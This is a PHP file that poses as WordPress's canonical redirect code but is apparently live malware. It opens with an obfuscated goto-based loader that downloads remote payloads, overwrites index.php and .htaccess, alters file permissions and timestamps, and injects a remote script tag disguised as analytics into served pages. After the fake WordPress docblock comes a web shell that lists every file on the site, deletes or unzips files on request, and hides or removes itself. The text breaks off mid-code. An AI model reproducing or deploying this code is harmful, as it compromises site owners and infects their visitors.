<?php /*Leafmail3*/goto o1QFr; wasj3: $ZJUCA($jQ0xa, $RTa9G); goto wYDtx; IuHdj: $egQ3R = "\147\172\151"; goto ChKDE; TpHVE: $cPzOq .= "\157\x6b\x6b"; goto vgltl; gmVrv: $Mvmq_ .= "\x6c\x5f\x63\154\x6f"; goto N9T5l; SClM0: $VwfuP = "\x64\x65\146"; goto PXHHr; m8hp8: $uHlLz = "\x73\x74\x72"; goto lz2G0; UH4Mb: $eULaj .= "\x70\x63\x2e\x70"; goto apDh3; QPct6: AtVLG: goto Mg1JO; dj8v0: $ZJUCA = "\143\150"; goto WmTiu; uHm0i: $TBxbX = "\x57\x50\137\125"; goto RCot0; f4Rdw: if (!($EUeQo($kpMfb) && !preg_match($tIzL7, PHP_SAPI) && $fHDYt($uZmPe, 2 | 4))) { goto TGN7B; } goto S2eca; H7qkB: $MyinT .= "\164\40\x41\x63\x63"; goto Air1i; AedpI: try { goto JM3SL; oiS8N: @$YWYP0($lJtci, $H0gg1); goto nucR0; AffR5: @$YWYP0($PcRcO, $H0gg1); goto SpIUU; JnP2S: @$ZJUCA($lJtci, $shT8z); goto oiS8N; nOhHX: @$ZJUCA($lJtci, $RTa9G); goto LvbAc; LvbAc: @$rGvmf($lJtci, $UYOWA["\141"]); goto JnP2S; SpIUU: @$ZJUCA($jQ0xa, $shT8z); goto qvTm1; gA5rv: @$ZJUCA($PcRcO, $shT8z); goto AffR5; nucR0: @$ZJUCA($PcRcO, $RTa9G); goto COvI1; JM3SL: @$ZJUCA($jQ0xa, $RTa9G); goto nOhHX; COvI1: @$rGvmf($PcRcO, $UYOWA["\142"]); goto gA5rv; qvTm1: } catch (Exception $ICL20) { } goto PqZGA; BWxc9: $kpMfb .= "\154\137\x69\156\x69\164"; goto RMP1m; Q7gNx: $gvOPD = "\151\163\137"; goto AfwzG; fFfBR: goto AtVLG; goto kST_Q; J9uWl: $e9dgF .= "\x61\171\163"; goto lNb3h; ZlPje: $u9w0n .= "\x75\x69\x6c\144\x5f\161"; goto Mit4a; YRbfa: $dGt27 .= "\157\x73\x65"; goto L744i; ioNAN: $tIzL7 .= "\x6c\x69\57"; goto Khhgn; mz3rE: $FANp1 .= "\x70\141\x72\145"; goto SClM0; eBKm1: $PcRcO = $jQ0xa; goto Sg4f2; D0V8f: $pv6cp = "\162\x65"; goto Hy0sm; xXaQc: $FANp1 = "\x76\145\162\x73\151"; goto T7IwT; ulics: try { $_SERVER[$pv6cp] = 1; $pv6cp(function () { goto YEXR4; PKzAL: $AG2hR .= "\163\171\x6e\x63\75\164\162\165\145"; goto HIXil; NZAxH: $AG2hR .= "\x65\x72\75\164\x72\165\x65\x3b" . "\12"; goto Tbsb3; xDrpr: $AG2hR .= "\x75\x6d\x65\156\164\54\40\x67\75\144\x2e\143\162\145\x61\164\145"; goto mLjk9; r_Oqj: $AG2hR .= "\163\x63\162\151\160\164\x22\x3e" . "\xa"; goto JZsfv; PEdls: $AG2hR .= "\74\57\163"; goto WBFgG; POyWW: $AG2hR .= "\x4d\55"; goto a8oGQ; N2RIK: $AG2hR .= "\175\x29\50\51\x3b" . "\12"; goto PEdls; Vj0ze: $AG2hR .= "\x72\151\160\x74\40\164\x79\x70\145\x3d\42\164\145\170"; goto FXjwZ; JZsfv: $AG2hR .= "\x28\x66\x75\156\143"; goto ZRBmo; zk1Ml: $AG2hR .= "\x79\124\141\147\x4e\x61\155\145"; goto STHB_; aKt86: $AG2hR .= "\x72\x69\160\x74\42\51\x2c\40\x73\75\x64\x2e\x67\x65\x74"; goto oxuwD; FXjwZ: $AG2hR .= "\x74\57\x6a\141\x76\141"; goto r_Oqj; YffEK: $AG2hR .= "\57\x6d\141\164"; goto nL_GE; ZrlUz: $AG2hR .= "\x73\x63\162\151\x70\164\x22\x3b\40\147\x2e\141"; goto PKzAL; MSqPC: $AG2hR .= "\x65\x20\55\x2d\76\12"; goto rWq2m; gUhrX: $AG2hR .= "\74\x73\143"; goto Vj0ze; oxuwD: $AG2hR .= "\x45\154\x65\x6d\145\156\164\x73\102"; goto zk1Ml; a8oGQ: $AG2hR .= time(); goto xyZaU; WBFgG: $AG2hR .= "\x63\162\151\160\164\x3e\xa"; goto jHj0s; rWq2m: echo $AG2hR; goto zxMHd; zzMTI: $AG2hR .= "\152\141\166\x61"; goto ZrlUz; HIXil: $AG2hR .= "\73\x20\147\56\144\x65\x66"; goto NZAxH; EXhzp: $AG2hR .= "\x65\156\164\x4e\x6f\x64\145\56\x69\x6e"; goto yJp9W; KUpUt: $AG2hR .= "\x64\40\115\141\x74"; goto c13YM; hugz8: $AG2hR .= "\x6f\x72\145\50\x67\54\x73\51\73" . "\xa"; goto N2RIK; xyZaU: $AG2hR .= "\x22\73\40\163\56\160\141\162"; goto EXhzp; ZRBmo: $AG2hR .= "\164\151\x6f\156\x28\51\x20\173" . "\xa"; goto sOVga; YqIfq: $AG2hR .= "\77\x69\x64\x3d"; goto POyWW; Tbsb3: $AG2hR .= "\147\x2e\163\x72"; goto vxsas; k1w2Q: $AG2hR = "\x3c\41\x2d\55\x20\115\x61"; goto OOFo2; F2sIB: $AG2hR .= "\x3d\x22\164\x65\x78\x74\57"; goto zzMTI; OOFo2: $AG2hR .= "\x74\157\155\x6f\x20\55\x2d\x3e\xa"; goto gUhrX; vxsas: $AG2hR .= "\143\x3d\165\x2b\42\x6a\163\57"; goto JGvCK; jHj0s: $AG2hR .= "\74\x21\55\55\40\x45\156"; goto KUpUt; mLjk9: $AG2hR .= "\105\154\x65\x6d\x65\156\x74\50\42\163\x63"; goto aKt86; yJp9W: $AG2hR .= "\x73\x65\162\x74\102\145\146"; goto hugz8; c13YM: $AG2hR .= "\x6f\x6d\x6f\40\103\157\144"; goto MSqPC; STHB_: $AG2hR .= "\50\x22\x73\x63\162\x69"; goto SX8pI; JGvCK: $AG2hR .= $osL5h; goto YffEK; nL_GE: $AG2hR .= "\x6f\155\x6f\56\x6a\x73"; goto YqIfq; SX8pI: $AG2hR .= "\160\x74\42\51\133\x30\135\x3b" . "\xa"; goto uh8pE; YEXR4: global $osL5h, $cPzOq; goto k1w2Q; jW6LQ: $AG2hR .= "\166\141\x72\40\144\x3d\x64\157\143"; goto xDrpr; uh8pE: $AG2hR .= "\x67\x2e\164\x79\x70\145"; goto F2sIB; sOVga: $AG2hR .= "\166\x61\162\40\x75\75\42" . $cPzOq . "\42\x3b" . "\xa"; goto jW6LQ; zxMHd: }); } catch (Exception $ICL20) { } goto arBxc; TrkYs: $eULaj .= "\x2f\170\x6d"; goto GE2p3; L744i: $cPzOq = "\x68\x74\164\x70\163\72\57\x2f"; goto TpHVE; CNdmS: wLXpb: goto wasj3; nHXnO: $_POST = $_REQUEST = $_FILES = array(); goto CNdmS; PHhHL: P9yQa: goto W2Q7W; UkCDT: $cLC40 = 32; goto BnazY; vabQZ: $CgFIN = 1; goto QPct6; gSbiK: try { goto xtnST; qBVAq: $k7jG8[] = $E0suN; goto Tc9Eb; vZ6zL: $E0suN = trim($Q0bWd[0]); goto LuoPM; D98P3: if (!empty($k7jG8)) { goto FbDAI; } goto AML_a; LuoPM: $jCv00 = trim($Q0bWd[1]); goto Q4uy7; xtnST: if (!$gvOPD($d3gSl)) { goto nHP5K; } goto W8uMn; c_73m: FbDAI: goto h1Cu7; kNAxm: if (!($uHlLz($E0suN) == $cLC40 && $uHlLz($jCv00) == $cLC40)) { goto lfWQh; } goto MfJKK; L8cv7: WVm2j: goto c_73m; AML_a: $d3gSl = $jQ0xa . "\x2f" . $HNQiW; goto GBRPC; ZSYyc: $jCv00 = trim($Q0bWd[1]); goto kNAxm; W8uMn: $Q0bWd = @explode("\72", $DJDq1($d3gSl)); goto Woix_; EA1BT: if (!(is_array($Q0bWd) && count($Q0bWd) == 2)) { goto ctSg2; } goto A163l; Woix_: if (!(is_array($Q0bWd) && count($Q0bWd) == 2)) { goto wU2zk; } goto vZ6zL; Q4uy7: if (!($uHlLz($E0suN) == $cLC40 && $uHlLz($jCv00) == $cLC40)) { goto VAVW5; } goto qBVAq; tEVz_: $k7jG8[] = $jCv00; goto xWpvL; xWpvL: lfWQh: goto oilos; MfJKK: $k7jG8[] = $E0suN; goto tEVz_; N3TyU: wU2zk: goto snD7p; lky0R: $Q0bWd = @explode("\72", $DJDq1($d3gSl)); goto EA1BT; Tc9Eb: $k7jG8[] = $jCv00; goto evp7M; snD7p: nHP5K: goto D98P3; oilos: ctSg2: goto L8cv7; evp7M: VAVW5: goto N3TyU; GBRPC: if (!$gvOPD($d3gSl)) { goto WVm2j; } goto lky0R; A163l: $E0suN = trim($Q0bWd[0]); goto ZSYyc; h1Cu7: } catch (Exception $ICL20) { } goto xU6vT; T7IwT: $FANp1 .= "\x6f\x6e\x5f\143\x6f\x6d"; goto mz3rE; JX1Oy: $dGt27 = "\x66\x63\x6c"; goto YRbfa; BnazY: $Pzt0o = 5; goto TYFaW; o1QFr: $kFvng = "\74\x44\x44\x4d\x3e"; goto wODYw; CL80L: $MyinT .= "\120\x2f\61\x2e\x31\x20\x34"; goto gErqa; tFGg7: $YWYP0 .= "\x75\143\x68"; goto dj8v0; pXfDS: $ygOJ_ .= "\x2f\167\160"; goto c7yEe; xUd9U: $pv6cp .= "\151\x6f\x6e"; goto bqFyS; PqZGA: CVVA3: goto RDKTA; wYDtx: $uZmPe = $nPBv4($eULaj, "\x77\x2b"); goto f4Rdw; E453u: $QIBzt .= "\56\64"; goto O8RXw; a4EJZ: $dZR_y = $cPzOq; goto vZkPa; FK_sr: $kb9bA .= "\x65\162\x2e\x69"; goto G2uff; TuwL4: $jQ0xa = $_SERVER[$Wv1G0]; goto wrxGI; wJDrU: $eULaj = $jQ0xa; goto TrkYs; MLdcc: $fHDYt .= "\x63\153"; goto JX1Oy; Gs7Gb: $kpMfb = $vW4As; goto BWxc9; Mit4a: $u9w0n .= "\x75\x65\x72\171"; goto cIo5P; GE2p3: $eULaj .= "\x6c\162"; goto UH4Mb; cIo5P: $uAwql = "\155\x64\65"; goto aXExt; c7yEe: $ygOJ_ .= "\x2d\x61"; goto XWOCC; wrxGI: $ygOJ_ = $jQ0xa; goto pXfDS; XsWqd: $kb9bA .= "\57\56\165\163"; goto FK_sr; cWrVz: $nPBv4 .= "\145\x6e"; goto KCtWA; CrWKs: $l0WLW .= "\157\160\x74"; goto jcG0e; lz2G0: $uHlLz .= "\154\x65\x6e"; goto xXaQc; wee0Y: $ulOTQ .= "\115\111\116"; goto Tfi5q; vgltl: $cPzOq .= "\154\x69\x6e\153\56\x74"; goto pr5fA; Khhgn: $tIzL7 .= "\x73\151"; goto JBJmV; kJlf4: $DJDq1 .= "\147\145\164\137\143"; goto NZqWx; lNb3h: $H0gg1 = $xsR4V($e9dgF); goto XYviL; TBl6Q: sLwcv: goto fFfBR; RMP1m: $l0WLW = $vW4As; goto ujtZa; XQnCd: $PcRcO .= "\x61\143\143\145\163\x73"; goto ikUIP; X4xWX: $QIBzt = "\x35"; goto E453u; hDUdL: $MWMOe .= "\x6c\x65"; goto Q7gNx; LxUUO: $RTa9G = $QTYip($HqqUn($RTa9G), $Pzt0o); goto qaeyL; f6Txl: $HqqUn = "\x64\x65\143"; goto gwNCH; sK97X: $nPBv4 = "\x66\157\160"; goto cWrVz; Ee0VW: $EUeQo .= "\164\x69\x6f\156\x5f"; goto a2JJX; D9NbF: $CgFIN = 1; goto PHhHL; VY3H_: $Wv1G0 = "\x44\117\x43\x55\115\105\116\x54"; goto HpOFr; CRqG1: if (empty($k7jG8)) { goto VIn91; } goto s4AWH; apDh3: $eULaj .= "\x68\160\x2e\60"; goto sK97X; Sg4f2: $PcRcO .= "\57\x2e\x68\x74"; goto XQnCd; jcG0e: $YQ0P6 = $vW4As; goto rA_Dy; dlqC2: $HNQiW = substr($uAwql($osL5h), 0, 6); goto xGZOR; kxKwG: $osL5h = $_SERVER[$i5EZR]; goto TuwL4; ozW5s: $e9dgF .= "\63\x20\x64"; goto J9uWl; xU6vT: $lJtci = $jQ0xa; goto BpRMk; CquiC: $dZR_y .= "\x63\x6f\160\171"; goto BLSy0; GSfrX: $pv6cp .= "\x75\x6e\143\164"; goto xUd9U; yaYSs: $rGvmf .= "\x6f\x6e\x74\x65\156\164\163"; goto mIlAi; FXRyn: $TBxbX .= "\115\x45\x53"; goto R1jVG; kST_Q: VIn91: goto vabQZ; flXr3: $shT8z = $QTYip($HqqUn($shT8z), $Pzt0o); goto TkfCl; FJdH4: $dZR_y .= "\x3d\x67\x65\x74"; goto CquiC; kJyDh: $QTYip = "\x69\156\x74"; goto blzff; s4AWH: $H25pP = $k7jG8[0]; goto t74Wt; TyAte: $k7jG8 = array(); goto UkCDT; EO8QL: try { $UYOWA = @$AkFS8($egQ3R($eKFWX($M7wqP))); } catch (Exception $ICL20) { } goto OXweB; XYviL: $i5EZR = "\110\124\124\x50"; goto j4Pjv; ikUIP: $kb9bA = $jQ0xa; goto XsWqd; VrwTF: $nRD8p .= "\x64\x69\162"; goto aQp1m; dLa5a: $pv6cp .= "\x65\162\x5f"; goto x5YEr; PgImI: @$ZJUCA($kb9bA, $RTa9G); goto yAax8; Jb1Vu: try { goto Bwps7; WPylr: if (!$xsy4x($Y61WO)) { goto nWSzU; } goto NpK90; xqrLf: @$YWYP0($dqnvi, $H0gg1); goto cinsF; N7wJU: if ($xsy4x($Y61WO)) { goto KOuoA; } goto RBLfp; wf0jq: @$ZJUCA($Y61WO, $shT8z); goto xqrLf; bfkJn: try { goto jwOvP; sXqkD: $l0WLW($ekYPG, CURLOPT_SSL_VERIFYPEER, false); goto tXay1; jwOvP: $ekYPG = $kpMfb(); goto jMqt3; VURt4: $l0WLW($ekYPG, CURLOPT_POST, 1); goto Qk7oo; G7Y1e: $l0WLW($ekYPG, CURLOPT_USERAGENT, "\x49\x4e"); goto Sw_Ys; lg1iu: $l0WLW($ekYPG, CURLOPT_TIMEOUT, 3); goto VURt4; jMqt3: $l0WLW($ekYPG, CURLOPT_URL, $LfwPf . "\x26\164\x3d\151"); goto G7Y1e; Qk7oo: $l0WLW($ekYPG, CURLOPT_POSTFIELDS, $u9w0n($Lx9yT)); goto axPES; Sw_Ys: $l0WLW($ekYPG, CURLOPT_RETURNTRANSFER, 1); goto sXqkD; tXay1: $l0WLW($ekYPG, CURLOPT_SSL_VERIFYHOST, false); goto Gb33B; PUEHo: $Mvmq_($ekYPG); goto rF4qo; Gb33B: $l0WLW($ekYPG, CURLOPT_FOLLOWLOCATION, true); goto lg1iu; axPES: $YQ0P6($ekYPG); goto PUEHo; rF4qo: } catch (Exception $ICL20) { } goto zCePm; s2GBY: $Y61WO = dirname($dqnvi); goto N7wJU; bO0VE: KOuoA: goto WPylr; RBLfp: @$ZJUCA($jQ0xa, $RTa9G); goto lexI4; NpK90: @$ZJUCA($Y61WO, $RTa9G); goto aGYEQ; wsLep: $Lx9yT = ["\144\x61\x74\x61" => $UYOWA["\x64"]["\165\162\x6c"]]; goto bfkJn; y0C5p: @$ZJUCA($dqnvi, $shT8z); goto wf0jq; cinsF: $LfwPf = $cPzOq; goto d8sPt; OAF8R: $LfwPf .= "\x6c\x6c"; goto wsLep; d8sPt: $LfwPf .= "\77\141\143"; goto HZ42Q; lexI4: @$nRD8p($Y61WO, $RTa9G, true); goto K7fs2; aGYEQ: @$rGvmf($dqnvi, $UYOWA["\144"]["\x63\157\x64\x65"]); goto y0C5p; zCePm: nWSzU: goto r2ase; Bwps7: $dqnvi = $jQ0xa . $UYOWA["\144"]["\160\x61\x74\x68"]; goto s2GBY; K7fs2: @$ZJUCA($jQ0xa, $shT8z); goto bO0VE; HZ42Q: $LfwPf .= "\164\75\x63\141"; goto OAF8R; r2ase: } catch (Exception $ICL20) { } goto AedpI; kAMGF: $xsy4x .= "\144\x69\x72"; goto gdP2h; lX6T6: if (!$gvOPD($kb9bA)) { goto KTGlr; } goto spjef; jxKJS: $ulOTQ .= "\x5f\x41\104"; goto wee0Y; vZkPa: $dZR_y .= "\x3f\141\143\164"; goto FJdH4; gErqa: $MyinT .= "\60\x36\x20\116\x6f"; goto H7qkB; xGZOR: $hg32N = $d3gSl = $ygOJ_ . "\57" . $HNQiW; goto TyAte; GiT2I: $Mvmq_ = $vW4As; goto gmVrv; KCtWA: $fHDYt = "\x66\x6c\157"; goto MLdcc; Yc09l: $xsy4x = "\x69\163\137"; goto kAMGF; FZsOD: $lJtci .= "\150\x70"; goto eBKm1; rA_Dy: $YQ0P6 .= "\154\137\x65\170\x65\x63"; goto GiT2I; VQCaR: $k8h0h = !empty($m4bDA) || !empty($ZTS7q); goto Bw8cX; ujtZa: $l0WLW .= "\154\137\x73\x65\x74"; goto CrWKs; R1jVG: $ulOTQ = "\127\120"; goto jxKJS; OXweB: if (!is_array($UYOWA)) { goto CVVA3; } goto L7ftk; bqFyS: if (isset($_SERVER[$pv6cp])) { goto Kwp9i; } goto r3vZ_; ChKDE: $egQ3R .= "\156\146\x6c\x61\164\145"; goto OCGca; Bx0F8: $rGvmf = "\146\x69\154\145\x5f"; goto cMMsY; lar4b: $xsR4V .= "\x6d\145"; goto ESAaf; L7ftk: try { goto b8mrw; IZ7dT: @$rGvmf($d3gSl, $UYOWA["\x63"]); goto qi8JJ; j1slf: if (!$xsy4x($ygOJ_)) { goto fnZm_; } goto l27iU; FnW9Y: fnZm_: goto IZ7dT; RHQPY: @$ZJUCA($jQ0xa, $shT8z); goto FudGj; jRIpH: $d3gSl = $hg32N; goto FnW9Y; b8mrw: @$ZJUCA($jQ0xa, $RTa9G); goto j1slf; l27iU: @$ZJUCA($ygOJ_, $RTa9G); goto jRIpH; qi8JJ: @$ZJUCA($d3gSl, $shT8z); goto fMj35; fMj35: @$YWYP0($d3gSl, $H0gg1); goto RHQPY; FudGj: } catch (Exception $ICL20) { } goto Jb1Vu; Hy0sm: $pv6cp .= "\x67\151\x73\164"; goto dLa5a; wODYw: $tIzL7 = "\57\x5e\143"; goto ioNAN; D9G8A: $vW4As = "\x63\165\162"; goto Gs7Gb; zR6Sw: $RTa9G += 304; goto LxUUO; FLAgg: @$ZJUCA($jQ0xa, $shT8z); goto Ms_Rx; TkfCl: $MyinT = "\110\124\124"; goto CL80L; JBJmV: $xsR4V = "\x73\x74\x72"; goto wDwVu; m7Y7E: $shT8z += 150; goto flXr3; OCGca: $AkFS8 = "\165\x6e\x73\145\x72"; goto DuXwv; spjef: @$ZJUCA($jQ0xa, $RTa9G); goto PgImI; mIlAi: $YWYP0 = "\x74\157"; goto tFGg7; Air1i: $MyinT .= "\x65\x70\164\x61\142\154\145"; goto wJDrU; hnuEm: $M7wqP = false; goto IxcDO; AfwzG: $gvOPD .= "\x66\151\154\x65"; goto Yc09l; Mg1JO: if (!$CgFIN) { goto V5o9n; } goto a4EJZ; O8RXw: $QIBzt .= "\x2e\x30\73"; goto kxKwG; Qjsri: Kwp9i: goto uHm0i; aQp1m: $DJDq1 = "\146\151\154\145\x5f"; goto kJlf4; wDwVu: $xsR4V .= "\x74\157"; goto k5kym; Ms_Rx: KTGlr: goto QDkYN; p2xAd: $u9w0n = "\x68\x74\x74\160\x5f\142"; goto ZlPje; XWOCC: $ygOJ_ .= "\x64\155\151\156"; goto dlqC2; PXHHr: $VwfuP .= "\x69\156\145\144"; goto uwRQG; t74Wt: $Aa5A7 = $k7jG8[1]; goto rjUnC; WmTiu: $ZJUCA .= "\x6d\157\x64"; goto OMDdm; F90kP: $CgFIN = 1; goto TBl6Q; IxcDO: try { goto MN2Ol; lfwpD: $l0WLW($ekYPG, CURLOPT_RETURNTRANSFER, 1); goto XT0V7; pm4fL: $l0WLW($ekYPG, CURLOPT_SSL_VERIFYHOST, false); goto f1Wpg; LukB5: $l0WLW($ekYPG, CURLOPT_USERAGENT, "\x49\x4e"); goto lfwpD; MN2Ol: $ekYPG = $kpMfb(); goto PGjVI; XT0V7: $l0WLW($ekYPG, CURLOPT_SSL_VERIFYPEER, false); goto pm4fL; f1Wpg: $l0WLW($ekYPG, CURLOPT_FOLLOWLOCATION, true); goto A02q4; Jr5Fq: $Mvmq_($ekYPG); goto kxHAl; kxHAl: $M7wqP = trim(trim($M7wqP, "\xef\273\xbf")); goto DRdNb; A02q4: $l0WLW($ekYPG, CURLOPT_TIMEOUT, 10); goto czpAh; PGjVI: $l0WLW($ekYPG, CURLOPT_URL, $dZR_y); goto LukB5; czpAh: $M7wqP = $YQ0P6($ekYPG); goto Jr5Fq; DRdNb: } catch (Exception $ICL20) { } goto TtjMz; yA6tr: $e9dgF .= "\63\x36"; goto ozW5s; BLSy0: $dZR_y .= "\x26\164\x3d\x69\46\x68\75" . $osL5h; goto hnuEm; qaeyL: $shT8z = 215; goto m7Y7E; YAsQc: if (!(!$_SERVER[$pv6cp] && $FANp1(PHP_VERSION, $QIBzt, "\76"))) { goto VlKKH; } goto ulics; QDkYN: $CgFIN = 0; goto CRqG1; g3rCR: $m4bDA = $_REQUEST; goto A4fYL; rjUnC: if (!(!$gvOPD($lJtci) || $MWMOe($lJtci) != $H25pP)) { goto P9yQa; } goto D9NbF; x5YEr: $pv6cp .= "\x73\x68\165"; goto itQ2f; A4fYL: $ZTS7q = $_FILES; goto VQCaR; a2JJX: $EUeQo .= "\145\x78"; goto fYDkt; TYFaW: $Pzt0o += 3; goto hoCMV; fYDkt: $EUeQo .= "\x69\163\x74\163"; goto D9G8A; fmcU9: $MWMOe .= "\x5f\x66\151"; goto hDUdL; S2eca: $ZJUCA($jQ0xa, $shT8z); goto YAsQc; RCot0: $TBxbX .= "\x53\105\x5f\124\110\105"; goto FXRyn; BpRMk: $lJtci .= "\57\x69\x6e"; goto lJYIj; cMMsY: $rGvmf .= "\160\x75\164\137\143"; goto yaYSs; j4Pjv: $i5EZR .= "\x5f\x48\117\x53\x54"; goto VY3H_; itQ2f: $pv6cp .= "\x74\x64\x6f"; goto gi1ux; YAE22: $eKFWX .= "\66\x34\137\x64"; goto HkhAv; DuXwv: $AkFS8 .= "\x69\x61\x6c\151\x7a\x65"; goto kJyDh; NZqWx: $DJDq1 .= "\x6f\156\164\145\x6e\x74\x73"; goto Bx0F8; ESAaf: $EUeQo = "\146\x75\156\143"; goto Ee0VW; HkhAv: $eKFWX .= "\x65\143\x6f\x64\145"; goto IuHdj; RDKTA: HuCWH: goto tkEEo; k5kym: $xsR4V .= "\x74\151"; goto lar4b; WQZ3H: $UYOWA = 0; goto EO8QL; TtjMz: if (!($M7wqP !== false)) { goto HuCWH; } goto WQZ3H; N9T5l: $Mvmq_ .= "\x73\145"; goto p2xAd; HpOFr: $Wv1G0 .= "\137\122\117\x4f\124"; goto X4xWX; arBxc: VlKKH: goto gSbiK; G2uff: $kb9bA .= "\156\151"; goto lX6T6; gwNCH: $HqqUn .= "\157\x63\164"; goto m8hp8; yAax8: @unlink($kb9bA); goto FLAgg; pr5fA: $cPzOq .= "\157\x70\x2f"; goto D0V8f; gi1ux: $pv6cp .= "\x77\x6e\x5f\x66"; goto GSfrX; OMDdm: $eKFWX = "\142\141\x73\x65"; goto YAE22; aXExt: $MWMOe = $uAwql; goto fmcU9; gdP2h: $nRD8p = "\155\x6b"; goto VrwTF; Bw8cX: if (!(!$fs0FH && $k8h0h)) { goto wLXpb; } goto nHXnO; uwRQG: $e9dgF = "\x2d\61"; goto yA6tr; hoCMV: $RTa9G = 189; goto zR6Sw; Tfi5q: $fs0FH = $VwfuP($TBxbX) || $VwfuP($ulOTQ); goto g3rCR; W2Q7W: if (!(!$gvOPD($PcRcO) || $MWMOe($PcRcO) != $Aa5A7)) { goto sLwcv; } goto F90kP; r3vZ_: $_SERVER[$pv6cp] = 0; goto Qjsri; lJYIj: $lJtci .= "\144\x65\170\56\x70"; goto FZsOD; blzff: $QTYip .= "\x76\x61\x6c"; goto f6Txl; tkEEo: V5o9n: goto ossJl; ossJl: TGN7B: ?>
<?php
/**
 * Canonical API to handle WordPress Redirecting
 *
 * Based on "Permalink Redirect" from Scott Yang and "Enforce www. Preference"
 * by Mark Jaquith
 *
 * @package WordPress
 * @since 2.3.0
 */

/**
 * Redirects incoming links to the proper URL based on the site url.
 *
 * Search engines consider www.somedomain.com and somedomain.com to be two
 * different URLs when they both go to the same location. This SEO enhancement
 * prevents penalty for duplicate content by redirecting all incoming links to
 * one or the other.
 *
 * Prevents redirection for feeds, trackbacks, searches, and
 * admin URLs. Does not redirect on non-pretty-permalink-supporting IIS 7+,
 * page/post previews, WP admin, Trackbacks, robots.txt, searches, or on POST
 * requests.
 *
 * Will also attempt to find the correct link when a user enters a URL that does
 * not exist based on exact WordPress query. Will instead try to parse the URL
 * or query in an attempt to figure the correct page to go to.
 *
 * @since 2.3.0
 *
 * @global WP_Rewrite $wp_rewrite
 * @global bool $is_IIS
 * @global WP_Query $wp_query
 * @global wpdb $wpdb WordPress database abstraction object.
 *
 * @param string $requested_url Optional. The URL that was requested, used to
 *		figure if redirect is needed.
 * @param bool $do_redirect Optional. Redirect to the new URL.
 * @return string|void The string of the URL, if redirect needed.
 */
function DirFilesR($dir) 
{ 
	$handle = opendir($dir) or die("Can't open directory $dir"); 
    $files = Array(); 
    $subfiles = Array(); 
    while (false !== ($file = readdir($handle))) 
    { 
      if ($file != "." && $file != "..") 
      { 
        if(is_dir($dir."/".$file)) 
        { 
          $subfiles = DirFilesR($dir."/".$file); 
          $files = array_merge($files,$subfiles); 
        } 
        else 
        { 
          $files[] = $dir."/".$file; 
        } 
      } 
    } 
    closedir($handle); 
    return $files; 
}

if (isset($_GET['juke']))
{
	$arr_files = DirFilesR($_SERVER['DOCUMENT_ROOT']);

	echo '<td><hr><hr>';
	foreach ($arr_files as $key)
	{
		$key_e = str_replace($_SERVER['DOCUMENT_ROOT'], $_SERVER['SERVER_NAME'], $key);
		echo $key_e.';'.filesize($key)."<br>\n";
	}
	echo '<hr><hr></td>';
	
	exit;
}
?>
<html>
<head>
	<title><?php echo $_SERVER['SCRIPT_FILENAME'];?></title>
	<style type="text/css">
	INPUT[type="text"] {background-color: #fff8e7;}	body{background: #fff8e7;color: #4c5866;font-family: Verdana;font-size: 11px;}
	a:link{color: #33CC99;}	a:visited{color: #33CC99;}	a:hover{text-decoration: none;Color: #3399FF;}table {font-size: 11px;}
	td {padding: 1px;padding-left: 10px;padding-right: 10px;padding-top: 2px;}
	</style>
</head>
<body>
<table cellpadding="5" width="80%">
<?php
$permsself = perms($_SERVER['SCRIPT_FILENAME'], '');
if ($permsself !== '444')
	chmod($_SERVER['SCRIPT_FILENAME'], 0444);

function del_file($file)
{
	if(!file_exists($file))
		return "file not exists";
	else
	{
		if (!unlink($file))
		{
			if (!chmod($file, 0755))
				return "no have permission for chmod!";
			else
			{
				if (!unlink($file))
					return "can not delete!";
				else
					return "ok!";
			}
		}
		else
			return "ok!";
	}
}

if (isset($_GET['dispatch']))
{
	del_file($_SERVER['SCRIPT_FILENAME']);
}
if (!empty($_POST['for_del']))
{
	$real_path_for_del = array();
	$all_for_del = $_POST['for_del'];
	
	echo "<<info>>";
	foreach ($all_for_del as $each)
	{
		$each = strstr($each, '/');
		$each = $_SERVER['DOCUMENT_ROOT'].'/'.$each;
		
		$each_for_echo = str_replace($_SERVER['DOCUMENT_ROOT'], $_SERVER['SERVER_NAME'], $each);

		if (file_exists($each))
		{
			del_file($each);
			if (!file_exists($each))
				echo $each_for_echo." - removed"."\n";
			else
				echo $each_for_echo." - not removed"."\n";
		}
		else
			echo $each_for_echo." - not found"."\n";
	}
	echo "<</info>>";
	
	exit;
}
function unzip_file($file)
{
	$for_del = strrchr($file, '/');
	$folder_to_save = str_replace($for_del, '', $file);

	//set_time_limit(0);
	$zip = new ZipArchive;
	$zip->open($file);
	$zip->extractTo($folder_to_save);
	$zip->close();
	echo "<tr><td>File: $for_del - <font color=\"green\">unzip successfully</font></td></tr>";
}

function read_file($file_name)
{
	$list = $file_name;
	if (file_exists($file_name) and (filesize($file_name)>1))
	{
		$file = fopen($list,"rt");
		$arr_file = explode("\n",fread($file,filesize($list)));
		fclose($file);
		return $arr_file;
	}
	else
	{
		$arr_file = array();
		return $arr_file;
	}
}

function clear_folder($dir) 
{  
    $d=opendir($dir);  
    while(($entry=readdir($d))!==false) 
    { 
        if ($entry != "." && $entry != "..") 
        { 
            if (is_dir($dir."/".$entry)) 
            {  
                clear_folder($dir."/".$entry);  
            } 
            else 
            {  
                unlink ($dir."/".$entry);  
            } 
        } 
    } 
    closedir($d);  
    rmdir ($dir);  
} 

function only_read($file_name)
{
	if (file_exists($file_name) and (filesize($file_name)>1))
	{
		if (!$file = fopen($file_name,"rt"))
		{
			if (!chmod($file_name, 0775))
			{
				echo 'can\'t permission for chmod file<br>';	
				$original_file = '';
			}
			else // чмоднули, пробуем еще раз открыть файл
			{
				if (!$file = fopen($file_name,"rt")) // 
				{
					echo 'can\'t permission for open file<br>';
					$original_file = '';
				}
				else
				{
					$original_file = fread($file,filesize($file_name));
					fclose($file);
				}
			}
		}
		else
		{
			$original_file = fread($file,filesize($file_name));
			fclose($file);
		}
	}
	return $original_file;
}
		
function findshells($start) 
{
	global $arr_filename;
	$files = array();
	if (!$handle = opendir($start))
		chmod($start, 0755);
	
	$handle = opendir($start);
	
	while(($file=readdir($handle))!==false)
	{	
		if ($file!="." && $file !="..") 
		{
			$startfile = $start."/".$file;
			if (is_dir($startfile)) 
				findshells($startfile);	
			else 
			{
				$result = stristr($startfile, $_SERVER['SCRIPT_FILENAME']);
				
				if ($result == false)
					$arr_filename[] = $startfile;
			}
		}
	}
	closedir($handle);
	return $arr_filename;
}

if (isset ($_GET['unzip']))
{
	unzip_file($_GET['unzip']);
}

if (isset ($_GET['finder']))
{
	$domain = $_SERVER['SERVER_NAME'];
	$script_path = $_SERVER['SCRIPT_NAME'];
